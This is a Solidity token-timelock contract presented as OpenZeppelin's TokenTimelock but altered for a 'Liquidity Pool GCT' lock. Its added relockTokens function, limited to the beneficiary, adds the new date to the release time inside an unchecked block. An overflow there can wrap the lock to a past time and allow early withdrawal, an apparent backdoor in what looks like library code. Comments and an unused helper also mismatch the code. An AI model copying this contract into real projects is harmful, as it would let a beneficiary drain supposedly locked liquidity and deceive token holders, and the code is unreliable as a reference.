// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/utils/TokenTimelock.sol)

pragma solidity ^0.8.0;

import "./libs/SafeERC20.sol";

/**
 * @dev A token holder contract that will allow a beneficiary to extract the
 * tokens after a given release time.
 *
 * Useful for simple vesting schedules like "advisors get all of their tokens
 * after 1 year".
 */
contract TokenTimelock {
    using SafeERC20 for IERC20;

    // ERC20 basic token contract being held
    IERC20 private immutable _token;

    // beneficiary of tokens after they are released
    address private immutable _beneficiary;

    // timestamp when token release is enabled
    uint256 private _releaseTime;

    string private _name = "Liquidity Pool GCT";

    /**
     * @dev Deploys a timelock instance that is able to hold the token specified, and will only release it to
     * `beneficiary_` when {release} is invoked after `releaseTime_`. The release time is specified as a Unix timestamp
     * (in seconds).
     */
    constructor(
        IERC20 token_,
        address beneficiary_,
        uint256 releaseTime_
    ) {
        require(releaseTime_ > block.timestamp, "TokenTimelock: release time is before current time");
        _token = token_;
        _beneficiary = beneficiary_;
        _releaseTime = releaseTime_;
    }

    /**
     * @dev Returns the name of the contract.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the timestamp of the block.
     */
    function currentTimestamp() public view virtual returns (uint256) {
        return block.timestamp;
    }

    /**
     * @dev Returns the token being held.
     */
    function token() public view virtual returns (IERC20) {
        return _token;
    }

    /**
     * @dev Returns the beneficiary that will receive the tokens.
     */
    function beneficiary() public view virtual returns (address) {
        return _beneficiary;
    }

    /**
     * @dev Returns the time when the tokens are released in seconds since Unix epoch (i.e. Unix timestamp).
     */
    function releaseTime() public view virtual returns (uint256) {
        return _releaseTime;
    }

    /**
     * @dev Set a new time when tokens will be released in seconds from Unix epoch (i.e. Unix timestamp).
     */
    function newReleaseTime() internal {
        _releaseTime += 2629743;
    }

    /**
     * @dev Set a new time when tokens will be released in seconds from Unix epoch (i.e. Unix timestamp).
     */
    function relockTokens(uint256 newDate) public virtual{
        require(newDate > releaseTime(), "TokenTimelock: new time is before release time");
        require(msg.sender == beneficiary(), "TokenTimeLock: only the beneficiary can re-lock the tokens");
        require(newDate > block.timestamp, "TokenTimelock: release time is before current time");

        unchecked {
            _releaseTime += newDate;
        }
    }

    /**
     * @dev Returns the amount of tokens that can be transfer after the release.
     */
    function amountToBeTransfered() public view virtual returns (uint256) {
        return token().balanceOf(address(this));
    }

    /**
     * @dev Transfers tokens held by the timelock to the beneficiary. Will only succeed if invoked after the release
     * time.
     */
    function release() public virtual {
        require(block.timestamp >= releaseTime(), "TokenTimelock: current time is before release time");

        uint256 amount = token().balanceOf(address(this));
        require(amount > 0, "TokenTimelock: no tokens to release");

        token().safeTransfer(beneficiary(), amount);
    }
}